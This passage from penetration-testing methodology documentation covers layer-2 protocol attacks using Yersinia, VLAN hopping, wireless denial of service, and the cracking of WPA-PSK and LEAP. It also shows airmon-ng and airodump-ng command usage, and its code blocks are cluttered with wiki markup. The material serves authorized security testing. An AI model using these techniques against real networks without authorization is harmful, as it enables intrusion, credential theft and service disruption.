<div class="section" id="hot-standby-router-protocol-hsrp">
<h4>Hot Standby Router Protocol (HSRP)<a class="headerlink" href="#hot-standby-router-protocol-hsrp" title="Permalink to this headline">¶</a></h4>
<p>Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy
protocol for establishing a fault-tolerant default gateway, and has been
described in detail in RFC 2281. The Virtual Router Redundancy Protocol
(VRRP) is a standards-based alternative to HSRP defined in IETF standard
RFC 3768. The two technologies are similar in concept, but not
compatible.</p>
<p>The protocol establishes a framework between network routers in order to
achieve default gateway failover if the primary gateway should become
inaccessible, in close association with a rapid-converging routing
protocol like EIGRP or OSPF. By multicasting packets, HSRP sends its
hello messages to the multicast address 224.0.0.2 (all routers) using
UDP port 1985, to other HSRP-enabled routers, defining priority between
the routers. The primary router with the highest configured priority
will act as a virtual router with a pre-defined gateway IP address and
will respond to the ARP request from machines connected to the LAN with
the MAC address 0000.0c07.acXX where XX is the group ID in hex. If the
primary router should fail, the router with the next-highest priority
would take over the gateway IP address and answer ARP requests with the
same mac address, thus achieving transparent default gateway fail-over.
A HSRP Basics Simulation visualizes Active/Standby election and link
failover with Hello, Coup, ARP Reply packets, and timers.</p>
<p>HSRP and VRRP are not routing protocols as they do not advertise IP
routes or affect the routing table in any way.</p>
<p>HSRP and VRRP on some routers have the ability to trigger a failover if
one or more interfaces on the router go down. This can be useful for
dual branch routers each with a single serial link back to the head end.
If the serial link of the primary router goes down, you would want the
backup router to take over the primary functionality and thus retain
connectivity to the head end. The tool for attacking HSRP is Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_141.png">Screenshot Here</a></p>
</div>
<div class="section" id="virtual-switch-redundancy-protocol-vsrp">
<h4>Virtual Switch Redundancy Protocol (VSRP)<a class="headerlink" href="#virtual-switch-redundancy-protocol-vsrp" title="Permalink to this headline">¶</a></h4>
<p>The Virtual Switch Redundancy Protocol (VSRP) is a proprietary network
resilience protocol developed by Foundry Networks and currently being
sold in products manufactured by both Foundry and Hewlett Packard. The
protocol differs from many others in use as it combines Layer 2 and
Layer 3 resilience - effectively doing the jobs of both Spanning tree
protocol and the Virtual Router Redundancy Protocol at the same time.
Whilst the restrictions on the physical topologies able to make use of
VSRP mean that it is less flexible than STP and VRRP it does
significantly improve on the failover times provided by either of those
protocols.</p>
</div>
<div class="section" id="dynamic-trunking-protocol-dtp">
<h4>Dynamic Trunking Protocol (DTP)<a class="headerlink" href="#dynamic-trunking-protocol-dtp" title="Permalink to this headline">¶</a></h4>
<p>The Dynamic Trunking Protocol (DTP) is a proprietary networking protocol
developed by Cisco Systems for the purpose of negotiating trunking on a
link between two VLAN-aware switches, and for negotiating the type of
trunking encapsulation to be used. It works on the Layer 2 of the OSI
model. VLAN trunks formed using DTP may utilize either IEEE 802.1Q or
Cisco ISL trunking protocols.</p>
<p>DTP should not be confused with VTP, as they serve different purposes.
VTP communicates VLAN existence information between switches. DTP aids
with trunk port establishment. Neither protocol transmits the data
frames that trunks carry. The tool for attacking DTP is Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_142.png">Screenshot Here</a></p>
</div>
<div class="section" id="spanning-tree-protocol-stp">
<h4>Spanning Tree Protocol (STP)<a class="headerlink" href="#spanning-tree-protocol-stp" title="Permalink to this headline">¶</a></h4>
<p>The Spanning Tree Protocol (STP) is a network protocol that ensures a
loop-free topology for any bridged Ethernet local area network. The
basic function of STP is to prevent bridge loops and ensuing broadcast
radiation. Spanning tree also allows a network design to include spare
(redundant) links to provide automatic backup paths if an active link
fails, without the danger of bridge loops, or the need for manual
enabling/disabling of these backup links.</p>
<p>STP is a Data Link Layer protocol. It is standardized as IEEE 802.1D. As
the name suggests, it creates a spanning tree within a mesh network of
connected layer-2 bridges (typically Ethernet switches), and disables
those links that are not part of the spanning tree, leaving a single
active path between any two network nodes. The tool for attacking STP is
Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_143.png">Screenshot Here</a></p>
</div>
<div class="section" id="open-shortest-path-first-ospf">
<h4>Open Shortest Path First (OSPF)<a class="headerlink" href="#open-shortest-path-first-ospf" title="Permalink to this headline">¶</a></h4>
<p>Open Shortest Path First (OSPF) is an adaptive routing protocol for
Internet Protocol (IP) networks. It uses a link state routing algorithm
and falls into the group of interior routing protocols, operating within
a single autonomous system (AS). It is defined as OSPF Version 2 in RFC
2328 (1998) for IPv4. The updates for IPv6 are specified as OSPF Version
3 in RFC 5340 (2008).</p>
</div>
<div class="section" id="rip">
<h4>RIP<a class="headerlink" href="#rip" title="Permalink to this headline">¶</a></h4>
<p>RIP is a dynamic routing protocol used in local and wide area networks.
As such it is classified as an interior gateway protocol (IGP). It uses
the distance-vector routing algorithm. It was first defined in RFC 1058
(1988). The protocol has since been extended several times, resulting in
RIP Version 2 (RFC 2453). Both versions are still in use today, although
they are considered to have been made technically obsolete by more
advanced techniques such as Open Shortest Path First (OSPF) and the OSI
protocol IS-IS. RIP has also been adapted for use in IPv6 networks, a
standard known as RIPng (RIP next generation) protocol, published in RFC
2080 (1997).</p>
</div>
<div class="section" id="vlan-hopping">
<h4>VLAN Hopping<a class="headerlink" href="#vlan-hopping" title="Permalink to this headline">¶</a></h4>
<p>VLAN hopping (virtual local area network hopping) is a computer security
exploit, a method of attacking networked resources on a VLAN. The basic
concept behind all VLAN hopping attacks is for an attacking host on a
VLAN to gain access to traffic on other VLANs that would normally not be
accessible. There are two primary methods of VLAN hopping: switch
spoofing and double tagging.</p>
<p>In a switch spoofing attack, an attacking host that is capable of
speaking the tagging and trunking protocols used in maintaining a VLAN
imitates a trunking switch. Traffic for multiple VLANs is then
accessible to the attacking host.</p>
<p>In a double tagging attack, an attacking host prepends two VLAN tags to
packets that it transmits. The first header (which corresponds to the
VLAN that the attacker is really a member of) is stripped off by a first
switch the packet encounters, and the packet is then forwarded. The
second, false, header is then visible to the second switch that the
packet encounters. This false VLAN header indicates that the packet is
destined for a host on a second, target VLAN. The packet is then sent to
the target host as though it were layer 2 traffic. By this method, the
attacking host can bypass layer 3 security measures that are used to
logically isolate hosts from one another. The tool for attacking 802.1q
is Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_144.png">Screenshot Here</a></p>
</div>
<div class="section" id="vlan-trunking-protocol-vtp">
<h4>VLAN Trunking Protocol (VTP)<a class="headerlink" href="#vlan-trunking-protocol-vtp" title="Permalink to this headline">¶</a></h4>
<p>VLAN Trunking Protocol (VTP) is a Cisco proprietary Layer 2 messaging
protocol that manages the addition, deletion, and renaming of Virtual
Local Area Networks (VLAN) on a network-wide basis. Cisco&#8217;s VLAN Trunk
Protocol reduces administration in a switched network. When a new VLAN
is configured on one VTP server, the VLAN is distributed through all
switches in the domain. This reduces the need to configure the same VLAN
everywhere. To do this, VTP carries VLAN information to all the switches
in a VTP domain. VTP advertisements can be sent over ISL, 802.1q, IEEE
802.10 and LANE trunks. VTP is available on most of the Cisco Catalyst
Family products. The tool for attacking VTP is Yersinia.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_145.png">Screenshot Here</a></p>
</div>
</div>
<div class="section" id="rf-access">
<h3>RF Access<a class="headerlink" href="#rf-access" title="Permalink to this headline">¶</a></h3>
<p>The goal of the earlier phases is to gather every possible piece of
information about the Radio Frequencies in use that can be leveraged
during this phase.</p>
<div class="section" id="unencrypted-wireless-lan">
<h4>Unencrypted Wireless LAN<a class="headerlink" href="#unencrypted-wireless-lan" title="Permalink to this headline">¶</a></h4>
<p>It is possible to actually connect to an unencrypted Wireless LAN
(WLAN). To connect to an unencrypted WLAN, you simply have to either
issue appropriate commands or use a GUI interface to connect.</p>
<div class="section" id="iwconfig-linux">
<h5>Iwconfig (Linux)<a class="headerlink" href="#iwconfig-linux" title="Permalink to this headline">¶</a></h5>
<div class="line-block">
<div class="line">The following commands to connect up to the ESSID. To ensure that the
wireless interface is down, issue the following:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ifconfig</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="n">down</span>
</pre></div>
</div>
<div class="line-block">
<div class="line">Force dhclient to release any currently assigned DHCP addresses with
the following command:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dhclient</span> <span class="o">-</span><span class="n">r</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<div class="line-block">
<div class="line">Bring the interface back up with the following command:</div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ifconfig</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="n">up</span>
</pre></div>
</div>
<p>Iwconfig is similar to ifconfig, but is dedicated to the wireless
interfaces. It is used to set the parameters of the network interface
which are specific to the wireless operation. To assign set the ESSID
(or Network Name to the wireless interface, use the following command:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iwconfig</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="n">essid</span> <span class="s2">&quot;ESSID_IN_QUOTES&quot;</span>
</pre></div>
</div>
<p>Next we need to set the operating mode of the device, which depends on
the network topology. Setting this to <em>Managed</em> means that we are
connecting to a network that is composed of access points.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iwconfig</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="n">mode</span> <span class="n">Managed</span>
</pre></div>
</div>
<p>Use dhclient to obtain a DHCP addresses with the following command:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">dhclient</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>At this point we should receive an IP address and be connected to the
client&#8217;s wireless network. Ensure that adequate screen shots are taken
to definitively indicate the ability to connect, receive an IP address,
and traverse the network.</p>
</div>
<div class="section" id="id52">
<h5>Windows (XP/7)<a class="headerlink" href="#id52" title="Permalink to this headline">¶</a></h5>
<p>Based upon the wireless network adapter installed, Windows will provide
you with a mechanism to connect to wireless networks. The version of
Windows utilized will dictate the process. For this reason we are
covering Windows XP and 7.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_146.png">Screenshot Here</a></p>
<p>Windows XP will show an icon with a notification that says it has found
wireless networks.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_147.png">Screenshot Here</a></p>
<p>Right-click the wireless network icon in the lower right corner of your
screen, and then click &#8220;View Available Wireless Networks.&#8221;</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_148.png">Screenshot Here</a></p>
<p>The Wireless Network Connection window appears and displays your
wireless network listed with the SSID you chose. If you don&#8217;t see your
network, click Refresh network list in the upper left corner. Click your
network, and then click Connect in the lower right corner.</p>
<p>Windows 7 offers the same ability to connect to wireless networks. On
the right side of the taskbar, you will see a wireless network icon like
the one below. Click on it.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_149.png">Screenshot Here</a></p>
<p>A window with available network connections will open. As you can see
from the screenshot below, the list is split by the type of available
network connections. At the top you have
<a class="reference external" href="http://en.wikipedia.org/wiki/Dial-up">dial-up</a> and <a class="reference external" href="http://en.wikipedia.org/wiki/VPN">virtual private
network (VPN)</a> connections, while
at the bottom you have a list of all the wireless networks which Windows
7 has detected. To refresh the list of available networks, click on the
button highlighted in the screenshot below.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_150.png">Screenshot Here</a></p>
<p>You can scroll down through the list of available networks. Once you
decided on which network to connect to, click on it. Next, click on the
<em>Connect</em> button.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_151.png">Screenshot Here</a></p>
<p>If everything is OK, Windows 7 will connect to the network you selected
using the given security key.</p>
</div>
</div>
<div class="section" id="attacking-the-access-point">
<h4>Attacking the Access Point<a class="headerlink" href="#attacking-the-access-point" title="Permalink to this headline">¶</a></h4>
<p>All identified access points are vulnerable to numerous attacks. For
completeness, we&#8217;ve included some attack methods that may not be a part
of all engagements. Ensure that the scoping is reviewed prior to
initiating any attacks.</p>
<div class="section" id="denial-of-service-dos">
<h5>Denial of Service (DoS)<a class="headerlink" href="#denial-of-service-dos" title="Permalink to this headline">¶</a></h5>
<p>Within the standard, there are two packets that help in this regard, the
<em>Clear To Send (CTS)</em> and <em>Request To Send (RTS)</em> packets. Devices use
RTS packets when they have something big to send, and they don&#8217;t want
other devices to step on their transmission. CTS packets are sent so
that the device knows it&#8217;s okay to transmit. Every device (other than
the one that sent the RTS) within the range of the CTS packet cannot
transmit anything for the duration specified.</p>
<p>The first technique is to transmit the CTS packets, meaning that anyone
in range of your signal will be unable to transmit. This requires a
high-gain Omni-directional antenna to a much greater impact. The second
technique is to send an RTS packet to the AP you are targeting. Once the
AP gets the RTS packet, it will send the CTS. A highly directional
antenna from a distance can be used to target the AP with an RTS packet.
Generally speaking, transmitting the CTS has a greater impact.</p>
</div>
</div>
<div class="section" id="cracking-passwords">
<h4>Cracking Passwords<a class="headerlink" href="#cracking-passwords" title="Permalink to this headline">¶</a></h4>
<div class="section" id="wpa-psk-wpa2-psk">
<h5>WPA-PSK/ WPA2-PSK<a class="headerlink" href="#wpa-psk-wpa2-psk" title="Permalink to this headline">¶</a></h5>
<p>WPA-PSK is vulnerable to brute force attack. Tools like Aircrack and
coWPAtty take advantage of this weakness and provided a way to test keys
against dictionaries. The problem is that it&#8217;s a very slow process.
Precomputational attacks are limited as the BSSID and the BSSID length
are seeded into the passphrase hash. This is why WPA-PSK attacks are
generally limited due by time. There is no difference between cracking
WPA or WPA2, the authentication is essentially the same.</p>
<p>The main requirement for any WPA/WPA2 is to capture the authentication
handshake and then use Aircrack-ng to crack the pre-shared key. This can
be done either actively or passively. &#8220;Actively&#8221; means you will
accelerate the process by deauthenticating an existing wireless client.
&#8220;Passively&#8221; means you simply wait for a wireless client to authenticate
to the WPA/WPA2 network.</p>
</div>
<div class="section" id="wpa-wpa2-enterprise">
<h5>WPA/WPA2-Enterprise<a class="headerlink" href="#wpa-wpa2-enterprise" title="Permalink to this headline">¶</a></h5>
<p>In environments with a large number of users, such as corporations or
universities, WPA/WPA2 pre-shared key management is not feasible. For
example, it wouldn&#8217;t be possible to track which users are connected and
it would be impossible to revoke access to the network for individuals
without changing the key for everyone. Therefore WPA2 Enterprise
authenticates users against a user database (RADIUS). Two common methods
to do that are WPA2-EAP-TTLS and WPA2-PEAP.</p>
</div>
</div>
<div class="section" id="attacks">
<h4>Attacks<a class="headerlink" href="#attacks" title="Permalink to this headline">¶</a></h4>
<div class="section" id="leap">
<h5>LEAP<a class="headerlink" href="#leap" title="Permalink to this headline">¶</a></h5>
<p>This stands for the Lightweight Extensible Authentication Protocol. This
protocol is based on 802.1X and helps minimize the original security
flaws by using WEP and a sophisticated key management system. This
EAP-version is safer than EAP-MD5. This also uses MAC address
authentication. LEAP is not safe against crackers. THC-LeapCracker can
be used to break Cisco&#8217;s version of LEAP and be used against computers
connected to an access point in the form of a dictionary attack. Anwrap
and asleap are other crackers capable of breaking LEAP.</p>
<p>Asleap</p>
<p>Asleap is a designed specifically to recover weak LEAP (Cisco&#8217;s
Lightweight Extensible Authentication Protocol) and PPTP passwords.
Asleap performs Weak LEAP and PPTP password recovery from pcap and
AiroPeek files or from live capture. Finally, it has the ability to
deauthenticate clients on a leap WLAN (speeding up leap password
recovery).</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_152.png">Screenshot Here</a></p>
<p>The first step involved in the use of asleap is to produce the necessary
database (.dat) and index files (.idx) using genkeys from the supplied
(-r) a dictionary (wordlist) file.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_153.png">Screenshot Here</a></p>
<p>The final step in recovering the weak LEAP password is to run the asleap
command with our newly created .dat and .idx files:</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_154.png">Screenshot Here</a></p>
</div>
<div class="section" id="x">
<h5>802.1X<a class="headerlink" href="#x" title="Permalink to this headline">¶</a></h5>
<p>802.1X is an IEEE Standard for port-based Network Access Control (PNAC).
It is part of the IEEE 802.1 group of networking protocols. It provides
an authentication mechanism to devices wishing to attach to a LAN or
WLAN.</p>
<div class="line-block">
<div class="line">IEEE 802.1X defines the encapsulation of the Extensible Authentication
Protocol (EAP) over IEEE 802 which is known as &#8220;EAP over LAN&#8221; or
EAPOL. There are two main attacks which can be used against 802.1X:</div>
</div>
<p>Key Distribution Attack</p>
<p>The key distribution attack exploits a weakness in the RADIUS protocol.
The key distribution attack relies on an attacker capturing the PMK
transmission between the RADIUS server and the AP. As the PMK is
transmitted outside of the TLS tunnel, its protection is solely reliant
on the RADIUS server&#8217;s HMAC-MD5 hashing algorithm. Should an attacker be
able to leverage a man-in-the-middle attack between the AP and RADIUS
sever, a brute-force attempt could be made to crack the RADIUS shared
secret. This would ultimately provide the attacker with access to the
PMK - allowing full decryption of all traffic between the AP and
supplicant.</p>
<p>RADIUS Impersonation Attack</p>
<p>The RADIUS impersonation attack relies on users being left with the
decision to trust or reject certificates from the authenticator.
Attackers can exploit this deployment weakness by impersonating the
target network&#8217;s AP service set identifier (SSID) and RADIUS server.
Once both the RADIUS server and AP have been impersonated the attacker
can issue a &#8216;fake&#8217; certificate to the authenticating user. After the
certificate has been accepted by the user the client will proceed to
authenticate via the inner authentication mechanism. This allows the
attacker to capture the MSCHAPv2 challenge/response and attempt to crack
it offline.</p>
</div>
<div class="section" id="peap">
<h5>PEAP<a class="headerlink" href="#peap" title="Permalink to this headline">¶</a></h5>
<p>The Protected Extensible Authentication Protocol (Protected EAP or PEAP)
is a protocol that encapsulates the Extensible Authentication Protocol
(EAP) within an encrypted and authenticated Transport Layer Security
(TLS) tunnel. The purpose was to correct deficiencies in EAP; EAP
assumed a protected communication channel, such as that provided by
physical security, so facilities for protection of the EAP conversation
were not provided.</p>
<p>RADIUS Impersonation Attack</p>
<p>The RADIUS impersonation attack relies on users being left with the
decision to trust or reject certificates from the authenticator.
Attackers can exploit this deployment weakness by impersonating the
target network&#8217;s AP service set identifier (SSID) and RADIUS server.
Once both the RADIUS server and AP have been impersonated the attacker
can issue a &#8216;fake&#8217; certificate to the authenticating user. After the
certificate has been accepted by the user the client will proceed to
authenticate via the inner authentication mechanism. This allows the
attacker to capture the MSCHAPv2 challenge/response and attempt to crack
it offline.</p>
<p>Authentication Attack</p>
<div class="line-block">
<div class="line">The PEAP authentication attack is a primitive means of gaining
unauthorized access to PEAP networks. By sniffing usernames from the
initial (unprotected) PEAP identity exchange an attacker can attempt
to authenticate to the target network by &#8216;guessing&#8217; user passwords.
This attack is often ineffective as the authenticator will silently
ignores bad login attempts ensuring a several second delay exists
between login attempts.</div>
</div>
</div>
<div class="section" id="eap-fast">
<h5>EAP-Fast<a class="headerlink" href="#eap-fast" title="Permalink to this headline">¶</a></h5>
<p>EAP-FAST (Flexible Authentication via Secure Tunneling) is Cisco&#8217;s
replacement for LEAP. The protocol was designed to address the
weaknesses of LEAP while preserving the &#8220;lightweight&#8221; implementation.
EAP-FAST uses a Protected Access Credential (PAC) to establish a TLS
tunnel in which client credentials are verified. EAP-FAST provides
better protection against dictionary attacks, but is vulnerable to MITM
attacks. Since many implementations of EAP-FAST leave anonymous
provisioning enabled, AP impersonation can reveal weak credential
exchanges.</p>
</div>
<div class="section" id="wep-wpa-wpa2">
<h5>WEP/WPA/WPA2<a class="headerlink" href="#wep-wpa-wpa2" title="Permalink to this headline">¶</a></h5>
<p>The core process of connecting to a WEP encrypted network revolves
around obtaining the WEP key for the purpose of connecting to the
network. There are several tools that can be used to perform attacks
against WEP.</p>
</div>
<div class="section" id="aircrack-ng">
<h5>Aircrack-ng<a class="headerlink" href="#aircrack-ng" title="Permalink to this headline">¶</a></h5>
<p>Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can
recover keys once enough data packets have been captured. It implements
the standard FMS attack along with some optimizations like KoreK
attacks, as well as the all-new PTW attack, thus making the attack much
faster compared to other WEP cracking tools.</p>
<p>The first step is to place the wireless interface in monitor mode by
entering:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p><strong>Airmon-ng</strong></p>
<p>Airmon-ng is used to enable monitor mode on wireless interfaces. It may
also be used to go back from monitor mode to managed mode. Entering the
airmon-ng command without parameters will show the interfaces status.</p>
<p>To start wlan0 in monitor mode:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p>To start wlan0 in monitor mode on channel 8:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span> <span class="mi">8</span>
</pre></div>
</div>
<p>To stop wlan0:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">stop</span> <span class="n">wlan0</span>
</pre></div>
</div>
<p>To check the status:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span>
</pre></div>
</div>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_155.png">Screenshot Here</a></p>
<p>Enter &#8220;iwconfig&#8221; to validate the wireless interfaces. The output should
look similar to:</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_156.png">Screenshot Here</a></p>
<p><strong>Airodump-ng</strong></p>
<p>Airodump-ng is used for packet capturing of raw 802.11 frames and is
particularly suitable for collecting WEP IVs (Initialization Vector) for
the intent of using them with Aircrack-ng. If you have a GPS receiver
connected to the computer, Airodump-ng is capable of logging the
coordinates of the found access points.</p>
<p>Usage:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">options</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;</span><span class="p">[</span><span class="o">&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">,</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">interface</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">,</span><span class="o">...&lt;</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span>

<span class="n">Options</span><span class="p">:</span>

<span class="o">--</span><span class="n">ivs</span>               <span class="p">:</span> <span class="n">Save</span> <span class="n">only</span> <span class="n">captured</span> <span class="n">IVs</span>

<span class="o">--</span><span class="n">gpsd</span>              <span class="p">:</span> <span class="n">Use</span> <span class="n">GPSd</span>

<span class="o">--</span><span class="n">write</span>    <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">prefix</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Dump</span> <span class="n">file</span> <span class="n">prefix</span>

<span class="o">-</span><span class="n">w</span>                  <span class="p">:</span> <span class="n">same</span> <span class="k">as</span> <span class="o">--</span><span class="n">write</span>

<span class="o">--</span><span class="n">beacons</span>           <span class="p">:</span> <span class="n">Record</span> <span class="nb">all</span> <span class="n">beacons</span> <span class="ow">in</span> <span class="n">dump</span> <span class="n">file</span>

<span class="o">--</span><span class="n">update</span>     <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">secs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Display</span> <span class="n">update</span> <span class="n">delay</span> <span class="ow">in</span> <span class="n">seconds</span>

<span class="o">--</span><span class="n">showack</span>           <span class="p">:</span> <span class="n">Prints</span> <span class="n">ack</span><span class="o">/</span><span class="n">cts</span><span class="o">/</span><span class="n">rts</span> <span class="n">statistics</span>

<span class="o">-</span><span class="n">h</span>                  <span class="p">:</span> <span class="n">Hides</span> <span class="n">known</span> <span class="n">stations</span> <span class="k">for</span> <span class="o">--</span><span class="n">showack</span>

<span class="o">-</span><span class="n">f</span>          <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">msecs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Time</span> <span class="ow">in</span> <span class="n">ms</span> <span class="n">between</span> <span class="n">hopping</span> <span class="n">channels</span>

<span class="o">--</span><span class="n">berlin</span>     <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">secs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Time</span> <span class="n">before</span> <span class="n">removing</span> <span class="n">the</span> <span class="n">AP</span><span class="o">/</span><span class="n">client</span>

<span class="kn">from</span> <span class="nn">the</span> <span class="n">screen</span> <span class="n">when</span> <span class="n">no</span> <span class="n">more</span> <span class="n">packets</span>

<span class="n">are</span> <span class="n">received</span> <span class="p">(</span><span class="n">Default</span><span class="p">:</span> <span class="mi">120</span> <span class="n">seconds</span><span class="p">)</span>

<span class="o">-</span><span class="n">r</span>           <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">file</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Read</span> <span class="n">packets</span> <span class="kn">from</span> <span class="nn">that</span> <span class="n">file</span>

<span class="o">-</span><span class="n">x</span>          <span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">msecs</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Active</span> <span class="n">Scanning</span> <span class="n">Simulation</span>

<span class="o">--</span><span class="n">output</span><span class="o">-</span><span class="nb">format</span>

<span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&lt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span><span class="n">formats</span><span class="o">&lt;</span><span class="n">nowiki</span><span class="o">&gt;&gt;&lt;/</span><span class="n">nowiki</span><span class="o">&gt;</span> <span class="p">:</span> <span class="n">Output</span> <span class="nb">format</span><span class="o">.</span> <span class="n">Possible</span> <span class="n">values</span><span class="p">:</span>

<span class="n">pcap</span><span class="p">,</span> <span class="n">ivs</span><span class="p">,</span> <span class="n">csv</span><span class="p">,</span> <span class="n">gps</span><span class="p">,</span> <span class="n">kismet</span><span class="p">,</span> <span class="n">netxml</span>

<span class="n">Short</span> <span class="nb">format</span> <span class="s2">&quot;-o&quot;</span>

